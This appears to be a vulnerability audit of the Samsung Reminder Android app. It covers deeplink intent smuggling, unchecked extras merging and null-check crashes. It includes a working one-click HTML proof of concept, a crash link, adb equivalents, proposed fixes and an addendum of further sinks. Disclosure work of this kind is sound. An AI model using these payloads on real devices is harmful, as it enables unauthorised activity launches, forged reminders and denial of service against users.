```

### Attack surface summary â€” three compounded issues

**(a) `putExtras(intent2)` on Branch A blindly merges attacker extras into a fresh, same-process AddActivity Intent.** The fresh Intent has `setClass(â€¦, AddActivity.class)` â€” so caller-permission check by ActivityManager is never applied (intra-app). Every attacker-controlled key from the BROWSABLE `reminder://` intent travels verbatim into AddActivity's `onCreate` â€” including `service_action_type=100` (â†’ V-006 `imageUris` pipeline), `checkPresetIds` (â†’ V-010 Serializable), `pending_request/result/data` (â†’ V-009 parseUri), and `popover_intent` (â†’ V-008 via D.l). **Any web page can trigger all of V-006 / V-008 / V-009 / V-010 / V-011 in one click via `reminder://` â†’ R1.**

**(b) Branch B smuggles arbitrary action on the reminder app's authority.** `M.c(popoverStr)` (V-008) returns an unchecked attacker Intent; R1 pins the action to `ReminderAddView` only for three known cases; for other actions (including the common `android.intent.action.VIEW` with a `content://com.samsung.android.app.reminder/viewdetail/...` data URI) the raw attacker Intent falls through unmodified and is handed to `y0.p(activity, intent, 1030)` â€” which calls `startActivityForResult`. Because `setPackage(...)` is *not* forced onto the raw-fall-through path, the attacker can target any intra-reminder activity via an action, or via a content-scheme VIEW. Combined with V-007's `y0.a/j`, an attacker can also land the intent into `KeyguardManager.semSetPendingIntentAfterUnlock` (V-007's post-unlock primitive) with one browser click.

**(c) Three NPE sites give a reliable DoS.** On Branch B, `kotlin.jvm.internal.m.e(extras);` at R1:1116 / 1122 / 1129 is a `checkNotNull` on `intentC.getExtras()`. An attacker whose smuggled Intent has the target action but no extras (e.g., `intent:#Intent;action=com.samsung.android.app.reminder.action.ReminderAddView;end`) triggers an `IllegalStateException` â†’ process crash. One-click web DoS against the reminder app.

**(d) Parcelable `AlarmOccasion` / `AlarmPlace` are copied onto the smuggled intent unchanged** (R1:1135, 1138). Downstream, if `AddActivity` believes these came from the trusted Quick-Add flow, attacker-chosen GPS coordinates or alarm times can be forged onto the reminder creation â€” a fake location-triggered reminder ("You have arrived at 1600 Pennsylvania Ave â€” tap here").

### End-to-end PoC (one-click web â†’ AddActivity with full extras)

```html
<!-- Works on any current Samsung device running a release build of the reminder app -->
<a id="k" href=''>Open Samsung Reminder</a>
<script>
  // Smuggled stage-2 Intent: no setPackage so V-008 M.c bypass works.
  const stage2 = "intent:#Intent;action=com.samsung.android.app.reminder.action.ReminderAddView;" +
                 "component=com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.add.AddActivity;" +
                 // payloads for downstream sinks:
                 "i.service_action_type=100;" +              // V-006 scan-reminder branch
                 "S.checkPresetIds=PLACEHOLDER;" +           // V-010 (need bytes via attacker Intent.putExtra in a native attacker app for a real gadget)
                 "S.uuid=deadbeef-0000-0000-0000-000000000000;" +
                 "i.add_view_type=2;" +
                 "i.pending_request=100;i.pending_result=-1;" +
                 "S.pending_data=intent%3A%23Intent%3Baction%3Dandroid.intent.action.VIEW%3Bend;" +
                 "end";
  document.getElementById('k').href =
    'intent://mainlist#Intent;scheme=reminder;' +
    'S.popover_intent=' + encodeURIComponent(stage2) + ';' +
    'B.add_reminder_from_share=true;' +                     // forces R1 Branch A â€” putExtras(intent2) merges all above
    'end';
</script>
```

**DoS one-click:**
```html
<a href='intent://x#Intent;scheme=reminder;S.popover_intent=intent%3A%23Intent%3Baction%3Dcom.samsung.android.app.reminder.action.ReminderAddView%3Bend;end'>crash</a>
```
Action present, extras absent â†’ `kotlin.jvm.internal.m.e(null)` at R1.java:1116 â†’ IllegalStateException â†’ process terminates.

**adb equivalents** (sanity test without a webpage):
```
# Chain into AddActivity
adb shell am start -a android.intent.action.VIEW \
  -d "reminder://mainlist" \
  --ez add_reminder_from_share true \
  --es popover_intent "intent:#Intent;action=com.samsung.android.app.reminder.action.ReminderAddView;component=com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.add.AddActivity;i.service_action_type=100;S.uuid=deadbeef;end"

# DoS
adb shell am start -a android.intent.action.VIEW \
  -d "reminder://x" \
  --es popover_intent "intent:#Intent;action=com.samsung.android.app.reminder.action.ReminderAddView;end"
```

### Root-cause fixes
1. Drop `.putExtras(intent2)` on Branch A â€” R1 knows exactly which extras are required for a share; merge only those explicit keys.
2. On Branch B, after `M.c(popoverStr)`, validate `intentC.getComponent().getPackageName()` equals the reminder package **and** that the action is one of a small allow-list. For the `VIEW` + `content://` fall-through, construct a fresh internal Intent instead of forwarding the attacker's.
3. Replace every `kotlin.jvm.internal.m.e(extras)` with a conditional `extras == null ? Bundle.EMPTY : extras`; NPE is never an acceptable response to a deeplink.
4. Do not propagate `AlarmOccasion` / `AlarmPlace` parcelable extras from external callers â€” gate them on `getCallingPackage()` equality to the reminder app.

### V-016 addendum â€” additional R1 surface
Discovered during full-file sweep (sub-agent audit of lines 1-900 / 900-1800 / 1800-2641):

- **R1.java:2402â€“2410 `w1(Uri uri)`** â€” reads `uri.getQueryParameter("from_space_category")` and `uri.getQueryParameter("to_space_category")` with no sanitisation, then calls `this.f31525X1.e0(toSpaceCategory)` â€” a presenter method that switches the displayed space. Implements interface `G1`; callers not yet traced. If `w1` is reachable from any exported deeplink, an attacker can flip the user's visible space silently (UI deception â€” user thinks they are editing private-space reminders while actually editing shared-space).
- **R1.java:2041â€“2050 `q2()` â†’ `ContentResolver.call(L6.e.k, "register_alarm", null, bundle)`** â€” provider call with a `Bundle` composed from attacker-influenced state. If attacker can reach `q2()` via deeplink-driven state changes, they can invoke `register_alarm` on the reminder ContentProvider without going through the normal alarm-setup UI. Provider impl (`L6.e`) needs tracing.
- **R1.java:2519 `x2(Intent intent, boolean z10)`** â€” downstream of V-016 Branch A/B; calls `com.samsung.android.app.reminder.base.utils.y0.q(activity, intent, 1030, gravity)` â‡’ `startActivityForResult(intent, 1030, bundle)`. This confirms the V-016 chain ends at a `startActivityForResult` with an attacker-shaped Intent on the reminder app's authority.
- **R1.java:1928â€“1931 `ContentResolver.notifyChange(URI_REMINDER_TRASH)`** â€” not directly a deeplink sink but can be weaponised for observer-based probing.
- **R1.java:336â€“369 `H1() / onListActivityResult`** â€” reads `intent.getBundleExtra("bundleFormSplitView")`, `getStringExtra("uuid")`, `getIntExtra("list_condition_type")`, etc. from a child activity result. If child activity (AddActivity) was itself attacker-influenced (V-009), the returned extras are attacker-tainted too â€” second-order propagation.
- Nothing additional worth reporting from lines 1-1069 or 1179-2400 â€” UI wiring, menu handlers, RecyclerView plumbing.

